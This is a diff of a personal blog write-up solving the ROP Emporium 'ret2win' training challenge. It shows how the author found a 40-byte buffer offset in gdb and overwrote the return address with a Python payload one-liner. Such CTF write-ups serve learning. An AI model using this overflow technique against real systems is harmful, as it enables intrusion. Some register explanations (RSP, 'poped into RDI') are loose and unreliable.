@@ -1,14 +1,16 @@
 ---
 layout: post
-title:  "Ret2win"
+title:  "ROP Emporium: Ret2win"
 date:   21-02-2020 13:34:34
 categories: exploitation
-tags: Exploitation ROP_Emporium Ret2win
+tags: Exploitation, ROP_Emporium, Ret2win
 ---
+
+As I am not that experienced with exploitation yet, I recently decided to follow the series of challenges offered by [ROP Emporium][link1]. The challenges will be explained here both as a documentation exercise and with the hope that other cybersecurity enthusiasts will be able to find some value in my post. Since I'll solve most of the challenges in x64 architecture, the following document might be helpful [x64 cheatsheet][link2]
 
 Requirement 
 ===========
-First we download the zip file for the challenges:
+First, we download the zip file for the challenges:
 {% highlight bash%}
 wget https://ropemporium.com/binary/rop_emporium_all_challenges.zip
 unzip rop_emporium_all_challenges.zip
@@ -48,13 +50,13 @@ echo "source ~/peda/peda.py" >> ~/.gdbinit
 
 Ret2win
 =======
-A first glance at the binary using r2 shows for main functions:
+A first glance at the binary using r2 shows three main functions:
 {% highlight bash%}
 0x00400746    1 111          sym.main
 0x004007b5    1 92           sym.pwnme
 0x00400811    1 32           sym.ret2win
 {% endhighlight %}
-Upon further examination, we can see to which address we need to return:
+Upon further examination, we can easily determine to which address we need to return to:
 {% highlight bash%}
 / (fcn) sym.ret2win 32
 |   sym.ret2win ();
@@ -69,9 +71,9 @@ Upon further examination, we can see to which address we need to return:
 |           0x0040082f      5d             pop rbp
 \           0x00400830      c3             ret
 {% endhighlight %}
-Next we need to determine our offset:
+Next, we need to determine our offset by providing the binary with a special non-repeatable pattern:
 {% highlight bash%}
-Creating our patterne:
+Creating our pattern:
 gdb ret2win
 pattern_create 200
 or 
@@ -122,14 +124,13 @@ Legend: code, data, rodata, value
 Stopped reason: SIGSEGV                                                                                   
 0x0000000000400810 in pwnme ()   
 {% endhighlight %}
-We can see that the stack pointer(RSP) has now been overwritten by the value "AA0AAFAAb"*.  Using this value, we can determine how much padding will be needed before writting the address to the fonction ret2win@0x00400811
+We can see that the stack pointer(RSP) has now been overwritten by the value "AA0AAFAAb".  Using this value, we can determine how much padding will be needed before writing the address to the function ret2win@0x00400811
 {% highlight bash%}
 pattern offset AA0AAFAAb
 AA0AAFAAb found at offset: 40
 {% endhighlight %}
-Now if all goes according to plan, the follow line should return the flags:
+Now if all goes according to plan, the following line should return the flags:
 {% highlight bash%}
-python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
 python -c 'print "\x90"*40                #Will take care of the padding
 +"\x11\x08\x40\x00\x00\x00\x00\x00\x00"'  #Will write our address into RSP
    
@@ -146,4 +147,7 @@ Segmentation fault
 
 {% endhighlight %}
    
-*Note that the value of RIP has not been overwritten, this is because in the x64 architecture, the value will not be poped into RDI if it cannot be jumped to or executed.
+*Note that the value of RIP has not been overwritten, this is because, in the x64 architecture, the value will not be poped into RDI if it cannot be jumped to or executed.
+
+[link1]:https://ropemporium.com/
+[link2]:/document/x64_cheatsheet.pdf
